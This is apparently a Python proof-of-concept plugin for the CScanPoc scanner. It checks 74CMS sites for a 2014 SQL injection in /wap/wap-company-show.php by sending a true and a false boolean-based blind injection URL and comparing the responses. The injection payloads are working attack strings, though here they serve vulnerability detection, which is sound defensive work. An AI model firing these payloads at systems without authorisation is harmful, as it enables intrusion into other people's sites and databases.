# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = '74CMS_0004'  # 平台漏洞编号，留空
    name = '骑士CMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-11'  # 漏洞公布时间
    desc = '''
        骑士CMS /wap/wap-company-show.php 参数未过滤完整，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.sitedirsec.com/exploit-1840.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '80aa152f-c75b-4f37-9cd7-1c6e742515c5'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer :http://www.wooyun.org/bugs/wooyun-2014-082539
            hh = hackhttp.hackhttp()
            arg = self.target
            true_url = arg + \
                '/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=52'  # true
            false_url = arg + \
                '/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=53'  # false
            code1, head1, res1, errcode1, finalurl1 = hh.http(true_url)
            code2, head2, res2, errcode2, finalurl2 = hh.http(false_url)

            if code1 == 200 and code2 == 200:
                if res1.find('url="wap-jobs-show.php?id=1"') != -1 and res2.find('url="wap-jobs-show.php?id=1"') == -1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name,url=false_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
